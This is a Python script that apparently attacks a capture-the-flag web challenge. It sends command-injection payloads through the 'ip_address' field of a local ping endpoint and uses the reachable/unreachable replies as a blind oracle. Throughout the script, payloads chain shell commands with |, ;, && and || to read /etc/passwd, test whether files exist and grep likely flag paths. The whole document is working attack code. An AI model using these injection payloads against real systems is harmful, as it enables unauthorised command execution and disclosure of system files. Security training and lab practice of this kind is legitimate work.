import requests

url = "http://127.0.0.1:32943/ping"

def send_payload(payload):
    """Send the payload and return the response text"""
    try:
        response = requests.post(url, data={"ip_address": payload}, timeout=10)
        return response.text
    except Exception as e:
        return f"ERROR: {str(e)}"

def classify_response(text):
    """Classify response as reachable or unreachable"""
    if "Host is unreachable!" in text:
        return "UNREACHABLE"
    elif "Host is reachable!" in text:
        return "REACHABLE"
    else:
        return "UNKNOWN"

print("[*] Direct pattern-based blind enumeration")
print("Testing if grep is available...")

# Check if grep is available
payload = "127.0.0.1 | grep -h"
text = send_payload(payload)
print(f"grep -h test: {classify_response(text)}")

# Strategy: Use grep to check for flag pattern
# If file exists and contains pattern -> grep succeeds?
# If file DNE -> grep fails?

print("\n[1] Testing grep on existing file with matching pattern")
print("    /etc/passwd should contain 'root'")
payload = "127.0.0.1 | grep root /etc/passwd"
text = send_payload(payload)
print(f"    Result: {classify_response(text)}")

print("\n[2] Testing grep on existing file with NON-matching pattern")
print("    /etc/passwd should NOT contain 'XYZ123NONEXISTENT'")
payload = "127.0.0.1 | grep XYZ123NONEXISTENT /etc/passwd"
text = send_payload(payload)
print(f"    Result: {classify_response(text)}")

print("\n[3] Testing grep on NON-existing file")
payload = "127.0.0.1 | grep root /nonexistent_xyz"
text = send_payload(payload)
print(f"    Result: {classify_response(text)}")

# Use ; vs | to control flow
# Strategy: If file exists AND contains pattern, do success path
# If file DNE or doesn't contain pattern, do failure path

print("\n" + "="*60)
print("BLIND ENUMERATION STRATEGY TESTS")
print("="*60)

# Pattern: Run ping first, then grep file for FLAG pattern
# If grep finds FLAG, it outputs and pipe returns success -> ???
# If grep doesn't find FLAG, returns error code -> pipe fails -> unreachable

print("\nTest A: grep for FLAG{} pattern with PIPE operator")
print("-" * 50)

# Testing on files that might exist
flag_paths = ["/flag", "/app/flag", "/tmp/flag", "/flag.txt", "/root/flag"]

for path in flag_paths:
    # Pattern: Use ; to ignore ping result, grep for FLAG
    # If grep succeeds (finds pattern), overall might be based on grep exit?
    payload = f"127.0.0.1; grep -E 'FLAG\{' {path} 2>/dev/null"
    text = send_payload(payload)
    result = classify_response(text)
    print(f"  {path}: {result}")

print("\nTest B: Using && to gate ping execution on file existence")
print("-" * 50)

# Pattern: [ -f FILE ] && ping ...
# If file exists -> ping runs -> reachable
# If file DNE -> ping doesn't run -> ??? (what does app show?)

payload = "[ -f /etc/passwd ] && 127.0.0.1"
text = send_payload(payload)
print(f"  File EXISTS (/etc/passwd): {classify_response(text)}")

payload = "[ -f /nonexistent_xyz ] && 127.0.0.1"
text = send_payload(payload)
print(f"  File DNE (/nonexistent_xyz): {classify_response(text)}")

# The && test should show different responses!

print("\nTest C: Using || to invert logic")
print("-" * 50)

payload = "[ -f /etc/passwd ] || 127.0.0.1"
text = send_payload(payload)
print(f"  File EXISTS, ping skipped: {classify_response(text)}")

payload = "[ -f /nonexistent_xyz ] || 127.0.0.1"
text = send_payload(payload)
print(f"  File DNE, ping runs: {classify_response(text)}")

